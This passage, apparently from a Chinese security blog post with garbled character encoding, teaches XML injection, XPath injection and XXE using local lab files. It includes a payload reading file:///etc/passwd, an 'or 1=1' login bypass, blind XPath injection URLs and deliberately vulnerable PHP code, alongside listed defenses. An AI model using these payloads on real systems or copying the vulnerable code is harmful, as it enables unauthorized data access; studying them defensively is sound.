PHPæ”¯æŒçš„åè®®ä¼šæ›´å¤šä¸€äº›ï¼Œä½†éœ€è¦ä¸€å®šçš„æ‰©å±•ï¼š</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202151023-cf02c3ba-14d2-1.png" alt="img"></p><p><strong>PHPå¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œå¸¸è§çš„åˆ©ç”¨åè®®</strong>ï¼š</p><pre><code class="xml">file://æ–‡ä»¶ç»å¯¹è·¯å¾„ å¦‚ï¼šfile:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p><strong>å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“</strong></p><pre><code class="xml">&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>ç¤ºä¾‹ä»£ç ï¼š</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  %file;]&gt;%file(å‚æ•°å®ä½“)æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;file;æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ã€‚</code></pre><h1 id="XMLæ³¨å…¥"><a href="#XMLæ³¨å…¥" class="headerlink" title="XMLæ³¨å…¥"></a>XMLæ³¨å…¥</h1><blockquote><p> XMLçš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®ã€‚<br> XMLæ³¨å…¥æ˜¯ä¸€ç§å¤è€çš„æŠ€æœ¯ï¼Œé€šè¿‡åˆ©ç”¨é—­åˆæ ‡ç­¾æ”¹å†™XMLæ–‡ä»¶å®ç°çš„ã€‚</p></blockquote><p><strong>XMLæ³¨å…¥ç®€ä»‹</strong></p><p> XMLæ˜¯ä¸€ç§æ•°æ®ç»„ç»‡å­˜å‚¨çš„æ•°æ®ç»“æ„æ–¹å¼ï¼Œå®‰å…¨çš„XMLåœ¨ç”¨æˆ·è¾“å…¥ç”Ÿæˆæ–°çš„æ•°æ®æ—¶å€™åº”è¯¥åªèƒ½å…è®¸ç”¨æˆ·æ¥å—çš„æ•°æ®ï¼Œéœ€è¦è¿‡æ»¤æ‰ä¸€äº›å¯ä»¥æ”¹å˜XMLæ ‡ç­¾ä¹Ÿå°±æ˜¯è¯´æ”¹å˜XMLç»“æ„æ’å…¥æ–°åŠŸèƒ½ï¼ˆä¾‹å¦‚æ–°çš„è´¦æˆ·ä¿¡æ¯ï¼Œç­‰äºæ·»åŠ äº†è´¦æˆ·ï¼‰çš„ç‰¹æ®Šè¾“å…¥ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤ï¼Œåˆ™å¯ä»¥å¯¼è‡´XMLæ³¨å…¥æ”»å‡»ã€‚</p><p><strong>XMLæ³¨å…¥å‰æ</strong></p><p> ï¼ˆ1ï¼‰ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶æ•°æ®çš„è¾“å…¥<br> ï¼ˆ2ï¼‰ç¨‹åºæœ‰æ‹¼å‡‘çš„æ•°æ®</p><p><strong>æ¡ˆä¾‹æ¼”ç¤º</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;username&gt;admin&lt;/username&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>å¯¹äºä¸Šé¢çš„xmlæ–‡ä»¶ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤ŸæŒæ§passwordå­—æ®µï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”ŸXMLæ³¨å…¥ã€‚å¦‚æ”»å‡»è€…è¾“å…¥ï¼š</p><pre><code class="xml">root&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;username&gt;hack&lt;/username&gt;&lt;password&gt;hacker    # åœ¨åŸæ–‡ä¸­ç»™å‡ºçš„æ˜¯ admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;ï¼Œæˆ‘è§‰å¾—è¿™æ ·ä¸å¯¹ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘æƒ³é”™äº†ï¼Œå…ˆå¡«å‘å§</code></pre><p>é‚£ä¹ˆä¸Šè¿°ä»£ç å°±ä¼šå˜ä¸º</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;name&gt;admin&lt;/name&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;3&quot;&gt;    &lt;name&gt;hack&lt;/name&gt;    &lt;password&gt;hacker&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>è¿™æ ·å°±é€šè¿‡XMLæ³¨å…¥æ·»åŠ äº†ä¸€ä¸ªåä¸ºhackã€å¯†ç ä¸ºï¼šhackerçš„ç®¡ç†å‘˜è´¦æˆ·ã€‚<br> XMLæ³¨å…¥ä¸¤å¤§è¦ç´ ï¼š<strong>æ ‡ç­¾é—­åˆå’Œè·å–XMLè¡¨ç»“æ„</strong></p><p><strong>XMLæ³¨å…¥é˜²å¾¡</strong></p><p> ï¼ˆ1ï¼‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤<br> ï¼ˆ2ï¼‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè½¬ä¹‰</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152614-05da2f0c-14d5-1.jpg" alt="img"></p><h1 id="XPathæ³¨å…¥"><a href="#XPathæ³¨å…¥" class="headerlink" title="XPathæ³¨å…¥"></a>XPathæ³¨å…¥</h1><p><strong>Xpathæ³¨å…¥ç®€ä»‹</strong></p><p>XPathæ³¨å…¥æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨XPath è§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„XPath  æŸ¥è¯¢ä»£ç ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ã€‚XPathæ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹WebæœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“XPathæŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡XPathæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªXMLæ–‡æ¡£çš„å®Œæ•´å†…å®¹ã€‚</p><p>XPathæ³¨å…¥å‘ç”Ÿåœ¨å½“ç«™ç‚¹ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ¥æ„é€ è¯·æ±‚ä»¥è·å–XMLæ•°æ®ã€‚æ”»å‡»è€…å¯¹ç«™ç‚¹å‘é€ç»è¿‡ç‰¹æ®Šæ„é€ çš„ä¿¡æ¯æ¥æ¢ç©¶ç«™ç‚¹ä½¿ç”¨çš„XMLæ˜¯å¦‚ä½•æ„é€ çš„ï¼Œä»è€Œè¿›ä¸€æ­¥è·å–æ­£å¸¸é€”å¾„ä¸‹æ— æ³•è·å–çš„æ•°æ®ã€‚å½“XMLæ•°æ®è¢«ç”¨ä½œè´¦æˆ·éªŒè¯æ—¶ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æå‡ä»–çš„æƒé™ã€‚</p><p><strong>Xpathæ”»å‡»ç‰¹ç‚¹</strong></p><p>XPathæ³¨å…¥æ”»å‡»åˆ©ç”¨ä¸¤ç§æŠ€æœ¯ï¼Œå³<strong>XPathæ‰«æ</strong>å’Œ <strong>XPathæŸ¥è¯¢å¸ƒå°”åŒ–</strong>ã€‚é€šè¿‡è¯¥æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æ¥è¿›è¡ŒXPathæŸ¥è¯¢çš„XMLæ•°æ®åº“ã€‚è¿™ç§æ”»å‡»å¯ä»¥æœ‰æ•ˆåœ°å¯¹ä»˜ä½¿ç”¨XPathæŸ¥è¯¢ï¼ˆå’ŒXMLæ•°æ®åº“ï¼‰ æ¥æ‰§è¡Œèº«ä»½éªŒè¯ã€æŸ¥æ‰¾æˆ–è€…å…¶å®ƒæ“ä½œã€‚</p><p>XPathæ³¨å…¥æ”»å‡»åŒSQLæ³¨å…¥æ”»å‡»ç±»ä¼¼ï¼Œä½†ä¸SQLæ³¨å…¥ç›¸æ¯”ï¼ŒXPathå…·æœ‰çš„ä¼˜åŠ¿ï¼š</p><ol><li>å¹¿æ³›æ€§<br> åªè¦æ˜¯åˆ©ç”¨XPathè¯­æ³•çš„Web åº”ç”¨ç¨‹åºè‹¥æœªå¯¹è¾“å…¥çš„XPathæŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨XPathæ³¨å…¥æ¼æ´ã€‚è€Œåœ¨SQLæ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­æ ¹æ®æ•°æ®åº“æ”¯æŒçš„SQLè¯­è¨€ä¸åŒï¼Œæ³¨å…¥æ”»å‡»çš„å®ç°å¯èƒ½ä¸åŒã€‚</li><li>å±å®³æ€§å¤§<br> XPathè¯­è¨€å‡ ä¹å¯ä»¥æ²¡æœ‰è®¿é—®æ§åˆ¶é™åˆ¶çš„å¼•ç”¨XMLæ–‡æ¡£çš„æ‰€æœ‰éƒ¨åˆ†ã€‚è€Œåœ¨SQLæ³¨å…¥ä¸­ï¼Œä¸€ä¸ªâ€œ<code>ç”¨æˆ·</code>â€çš„æƒé™å¯èƒ½è¢«é™åˆ¶åˆ° æŸä¸€ç‰¹å®šçš„è¡¨ã€åˆ—æˆ–è€…æŸ¥è¯¢ã€‚<br> XPathæ³¨å…¥æ”»å‡»å¯ä»¥ä¿è¯å¾—åˆ°å®Œæ•´çš„XMLæ–‡æ¡£ï¼Œå³å®Œæ•´çš„æ•°æ®åº“ã€‚åªè¦WebæœåŠ¡åº”ç”¨å…·æœ‰åŸºæœ¬çš„å®‰å…¨æ¼æ´ï¼Œå³å¯æ„é€ é’ˆå¯¹ XPathåº”ç”¨çš„è‡ªåŠ¨æ”»å‡»ã€‚</li></ol><p><strong>XPathæ³¨å…¥æ”»å‡»åŸç†ä¸åº”ç”¨</strong></p><p>XPathæ³¨å…¥æ”»å‡»ä¸»è¦æ˜¯é€šè¿‡æ„å»ºç‰¹æ®Šçš„è¾“å…¥ï¼Œè¿™äº›è¾“å…¥å¾€å¾€æ˜¯XPathè¯­æ³•ä¸­çš„ä¸€äº›ç»„åˆï¼Œè¿™äº›è¾“å…¥å°†ä½œä¸ºå‚æ•°ä¼ å…¥Web åº”ç”¨ç¨‹åºï¼Œé€šè¿‡æ‰§è¡ŒXPathæŸ¥è¯¢è€Œæ‰§è¡Œå…¥ä¾µè€…æƒ³è¦çš„æ“ä½œã€‚<br> æ³¨å…¥å¯¹è±¡ä¸æ˜¯æ•°æ®åº“usersè¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„XMLæ–‡ä»¶ã€‚å› ä¸ºxpathä¸å­˜åœ¨è®¿é—®æ§åˆ¶ï¼Œæ‰€ä»¥ä¸ä¼šé‡åˆ°è®¸å¤šåœ¨SQLæ³¨å…¥ä¸­ç»å¸¸é‡åˆ°çš„è®¿é—®é™åˆ¶ã€‚ æ³¨å…¥å‡ºç°çš„ä½ç½®ä¹Ÿå°±æ˜¯<code>cookie</code>ï¼Œ<code>headers</code>ï¼Œ<code>request</code> <code>parameters/input</code>ç­‰ã€‚</p><p> é¦–å…ˆè¦å»äº†è§£xPathåŸºç¡€è¯­æ³•â€”â€“&gt;  <a href="https://www.freebuf.com/column/211251.html">xPathæ³¨å…¥å­¦ä¹ ä¹‹åŸºç¡€è¯­æ³•å­¦ä¹ </a></p><p>å¦‚æœä¸€ä¸ªç½‘ç«™æŸåº”ç”¨ç¨‹åºå°†æ•°æ®ä¿å­˜åœ¨XMLä¸­ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšé™åˆ¶ï¼Œæ”»å‡»è€…æäº¤äº†æ²¡æœ‰ç»è¿‡å¤„ç†çš„è¾“å…¥ï¼Œå°±æ’å…¥åˆ° XPath æŸ¥è¯¢ä¸­ï¼Œå³äº§ç”ŸXpathæ³¨å…¥ï¼Œé‚£ä¹ˆå°±æ”»å‡»è€…å°±å¯èƒ½é€šè¿‡æ§åˆ¶æŸ¥è¯¢ï¼Œè·å–æ•°æ®ï¼Œæˆ–è€…åˆ é™¤æ•°æ®ä¹‹ç±»çš„æ“ä½œã€‚</p><p>Xpathæ˜¯xmlè·¯å¾„è¯­è¨€ï¼Œç”¨äºé…ç½®æ–‡ä»¶çš„æŸ¥æ‰¾ã€‚æ•°æ®åº“å°±æ˜¯xmlæ–‡ä»¶ã€‚å› æ­¤åªè¦æ˜¯åˆ©ç”¨XPathè¯­æ³•çš„Web åº”ç”¨ç¨‹åºå¦‚æœæœªå¯¹è¾“å…¥çš„XPathæŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨XPathæ³¨å…¥æ¼æ´ã€‚æ¯”å¦‚ä¸€äº›ç™»å½•åœ°å€é¡µé¢ï¼Œæœç´¢é¡µé¢éœ€è¦ä¸xmläº¤äº’çš„ä½ç½®ã€‚</p><p><strong>XPathç›´æ¥æ³¨å…¥</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;         &lt;user&gt;             &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;test1&lt;/username&gt;            &lt;password&gt;test1&lt;/password&gt;        &lt;/user&gt;         &lt;user&gt;             &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;test2&lt;/username&gt;            &lt;password&gt;test2&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;&lt;/root&gt;</code></pre><p>test.php(ç”¨äºæ¥å—ä¼ å…¥å‚æ•°ï¼Œå¹¶è¿›è¡ŒxmlæŸ¥è¯¢)</p><pre><code class="php">&lt;?php$xml=simplexml_load_file(&#39;test.xml&#39;);$name=$_GET[&#39;name&#39;];$pwd=$_GET[&#39;pwd&#39;];$query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result=$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;;    foreach($result as $key=&gt;$value)&#123;        echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username;        echo &#39;&lt;br /&gt;Password:&#39;.$value-&gt;password;    &#125;&#125;?&gt;</code></pre><p><strong><a href="http://www.w3school.com.cn/php/func_simplexml_load_file.asp"><code>simplexml_load_file()</code>å‡½æ•°</a></strong><br> è¿”å›ç±» SimpleXMLElement çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„å±æ€§åŒ…å« XML æ–‡æ¡£ä¸­çš„æ•°æ®</p><p>æˆ‘ä»¬å…ˆä¼ å…¥æ­£å¸¸å‚æ•°</p><pre><code>http://127.0.0.1/test.php?name=test1&amp;pwd=test1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230048387.png" alt="image-20220421230048387"></p><p>æˆåŠŸè¿”å›äº†æˆ‘ä»¬éœ€è¦çš„å€¼</p><p>å¦‚æœæˆ‘ä»¬åœ¨usernameä¸­è¾“å…¥æ¶æ„çš„å€¼ï¼Œæ¯”å¦‚</p><pre><code>&#39; or 1=1 or &#39;&#39; = &#39;</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬çš„XPathæŸ¥è¯¢è¯­å¥å°±å˜ä¸º</p><pre><code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39; = &#39;&#39; and password/text()=&#39;test1&#39;] #andçš„ä¼˜å…ˆçº§é«˜äºor</code></pre><p>æˆ‘ä»¬çœ‹å‡ºç°äº†ä»€ä¹ˆæƒ…å†µ</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230408461.png" alt="image-20220421230408461"></p><p>è¿™ä¸ªè¯­å¥å¯¼è‡´äº†ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯æ‰€æœ‰çš„userå…ƒç´ éƒ½æ»¡è¶³è¦æ±‚</p><p>ä¸Šé¢è¿™ä¸ªå­—ç¬¦ä¸²ä¼šåœ¨é€»è¾‘ä¸Šä½¿æŸ¥è¯¢ä¸€ç›´è¿”å› trueï¼Œå¹¶å°†ä¸€ç›´å…è®¸æ”»å‡»è€…è®¿é—®ç³»ç»Ÿ</p><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XPath åœ¨åº”ç”¨ç¨‹åºä¸­åŠ¨æ€åœ°æ“ä½œ XML æ–‡æ¡£ã€‚æ”»å‡»å®Œæˆç™»å½•å¯ä»¥å†é€šè¿‡XPathç›²æ³¨æŠ€æœ¯è·å–æœ€é«˜æƒé™å¸å·å’Œå…¶å®ƒé‡è¦æ–‡æ¡£ä¿¡æ¯ã€‚</p><p><strong>XPathç›²æ³¨</strong></p><p>å¦‚æœæƒ³è¦æ„é€ æ¶æ„è¯­å¥éå†å‡ºæ•´ä¸ªXMLæ–‡æ¡£ï¼Œä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1.ç›²æ³¨æ ¹èŠ‚ç‚¹</p><p>åˆ©ç”¨countï¼ˆ/*ï¼‰åˆ¤æ–­æ ¹ä¸‹èŠ‚ç‚¹ï¼š</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421233640335.png" alt="image-20220421233640335"></p><p>è¿™æ¡è¯­å¥çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥åˆ¨æä¸‹</p><pre><code>/root/users/user[username/text()=&#39;&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>å¯¹äºè¿™ä¸ªXPathè¯­å¥ï¼Œé¦–å…ˆæ‰§è¡Œandè¯­å¥</p><pre><code>&#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>è¿™æ¡æ’ä¸ºå‡</p><p>ç„¶å</p><pre><code>username/text()=&#39;&#39; or count(/*) = 1</code></pre><p>è¿™æ¡åœ¨æ ¹èŠ‚ç‚¹ä¸º1çš„æ—¶å€™ä¸ºçœŸï¼Œä¸æ˜¯1å°±ä¸ºå‡</p><p>ç„¶åç®€åŒ–ä¸€ä¸‹</p><pre><code>çœŸ/å‡ or å‡</code></pre><p>æˆ‘ä»¬å‘ç°ï¼Œåˆ¤æ–­è¿™æ¡è¯­å¥æ˜¯å¦ä¸ºçœŸçš„å…³é”®ç‚¹æ˜¯</p><pre><code>count(/*) = 1</code></pre><p>å½“æ ¹èŠ‚ç‚¹ä¸º1æ—¶ï¼Œå°±å¯ä»¥é€‰å‡ºæ‰€ä»¥userå…ƒç´ ï¼Œä¸æ˜¯1æ—¶ï¼Œå°±æ— æ³•é€‰å‡ºï¼Œç”±æ­¤å°±å¯ä»¥åˆ¤æ–­æ ¹èŠ‚ç‚¹ä¸ªæ•°</p><p>ä»…ä»…åˆ¤æ–­äº†ä¸ªæ•°æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜è¦çŸ¥é“å®ƒæ˜¯ä»€ä¹ˆå­—ç¬¦æ‰å¯ä»¥ï¼Œå¯ä»¥ä½¿ç”¨substringåˆ†å‰²æ ¹èŠ‚ç‚¹çš„æ¯ä¸ªå­—ç¬¦ï¼ŒçŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421234716211.png" alt="image-20220421234716211"></p><p>æ ¹æ®è¿™æ ·çš„åŸç†å†™ä¸€ä¸ªè„šæœ¬å°±okäº†</p><p>2.ç›²æ³¨rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹</p><p>åˆ¤æ–­rootæ˜¯å¦æœ‰ä¸‹ä¸€çº§(1ä¸ª)èŠ‚ç‚¹</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p>åŒç†çŒœè§£rootä¸‹ä¸€çº§èŠ‚ç‚¹</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421235135999.png" alt="image-20220421235135999"></p><p>ä¸€ç›´æŒ‰ç…§è¿™æ ·çš„æ­¥éª¤å¾€ä¸‹å³å¯</p><p><strong>XPathæ³¨å…¥å±å®³</strong></p><ul><li>åœ¨URLåŠè¡¨å•ä¸­æäº¤æ¶æ„XPathä»£ç ï¼Œå¯è·å–åˆ°æƒé™é™åˆ¶æ•°æ®çš„è®¿é—®æƒï¼Œå¹¶å¯ä¿®æ”¹è¿™äº›æ•°æ®ã€‚</li><li>å¯é€šè¿‡æ­¤ç±»æ¼æ´æŸ¥è¯¢è·å–åˆ°ç³»ç»Ÿå†…éƒ¨å®Œæ•´çš„XMLæ–‡æ¡£å†…å®¹ã€‚</li><li>é€»è¾‘ä»¥åŠè®¤è¯è¢«ç»•è¿‡ï¼Œå®ƒä¸åƒæ•°æ®åº“é‚£æ ·æœ‰å„ç§æƒé™ï¼Œxmlæ²¡æœ‰å„ç§æƒé™çš„æ¦‚å¿µ,æ­£å› ä¸ºæ²¡æœ‰æƒé™æ¦‚å¿µï¼Œå› æ­¤åˆ©ç”¨xpathæ„é€ æŸ¥è¯¢çš„æ—¶å€™æ•´ä¸ªæ•°æ®åº“éƒ½ä¼šè¢«ç”¨æˆ·è¯»å–ã€‚</li></ul><p><strong>XPathæ³¨å…¥é˜²å¾¡</strong></p><ol><li>æ•°æ®æäº¤åˆ°æœåŠ¡å™¨ä¸Šç«¯ï¼Œåœ¨æœåŠ¡ç«¯æ­£å¼å¤„ç†è¿™æ‰¹æ•°æ®ä¹‹å‰ï¼Œå¯¹æäº¤æ•°æ®çš„åˆæ³•æ€§è¿›è¡ŒéªŒè¯ã€‚</li><li>æ£€æŸ¥æäº¤çš„æ•°æ®æ˜¯å¦åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç è½¬æ¢æˆ–æ›¿æ¢ã€åˆ é™¤æ•æ„Ÿå­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚</li><li>å¯¹äºç³»ç»Ÿå‡ºç°çš„é”™è¯¯ä¿¡æ¯ï¼Œä»¥IEé”™è¯¯ç¼–ç ä¿¡æ¯æ›¿æ¢ï¼Œå±è”½ç³»ç»Ÿæœ¬èº«çš„å‡ºé”™ä¿¡æ¯ã€‚</li><li>å‚æ•°åŒ–XPathæŸ¥è¯¢ï¼Œå°†éœ€è¦æ„å»ºçš„XPathæŸ¥è¯¢è¡¨è¾¾å¼ï¼Œä»¥å˜é‡çš„å½¢å¼è¡¨ç¤ºï¼Œå˜é‡ä¸æ˜¯å¯ä»¥æ‰§è¡Œçš„è„šæœ¬ã€‚</li><li>é€šè¿‡MD5ã€SSLç­‰åŠ å¯†ç®—æ³•ï¼Œå¯¹äºæ•°æ®æ•æ„Ÿä¿¡æ¯å’Œåœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­åŠ å¯†ï¼Œå³ä½¿æŸäº›éæ³•ç”¨æˆ·é€šè¿‡éæ³•æ‰‹æ³•è·å–æ•°æ®åŒ…ï¼Œçœ‹åˆ°çš„ä¹Ÿæ˜¯åŠ å¯†åçš„ä¿¡æ¯ã€‚ æ€»ç»“ä¸‹å°±æ˜¯ï¼šé™åˆ¶æäº¤éæ³•å­—ç¬¦ï¼Œå¯¹è¾“å…¥å†…å®¹ä¸¥æ ¼æ£€æŸ¥è¿‡æ»¤ï¼Œå‚æ•°åŒ–XPathæŸ¥è¯¢çš„å˜é‡ã€‚</li></ol><h1 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</h1><p><strong>XXEæ¼æ´ç®€ä»‹</strong></p><p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br> XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚<br> XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><p>è§£æxmlåœ¨phpåº“libxmlï¼Œlibxml&gt;=2.9.0çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰XXEæ¼æ´ã€‚<br> <a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>å¯ä»¥è¯»å–XML</p><p><strong>æœ¬åœ°ç¯å¢ƒæ­å»º</strong></p><p>test.php</p><pre><code class="php">&lt;?php$xmlfile=file_get_contents(&#39;php://input&#39;);$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=&quot;$xxe \n&quot;;echo $str;?&gt;</code></pre><ul><li><code>file_get_contents</code>è·å–å®¢æˆ·ç«¯è¾“å…¥å†…å®¹</li><li><code>new DOMDocument()</code>åˆå§‹åŒ–XMLè§£æå™¨</li><li><code>loadXML($xmlfile)</code>åŠ è½½å®¢æˆ·ç«¯è¾“å…¥çš„XMLå†…å®¹</li><li><code>simplexml_import_dom($dom)</code>è·å–XMLæ–‡æ¡£èŠ‚ç‚¹ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›SimpleXMLElementå¯¹è±¡ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›FALSEã€‚</li><li>è·å–SimpleXMLElementå¯¹è±¡ä¸­çš„èŠ‚ç‚¹XXEï¼Œç„¶åè¾“å‡ºXXEå†…å®¹ã€‚</li></ul><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM 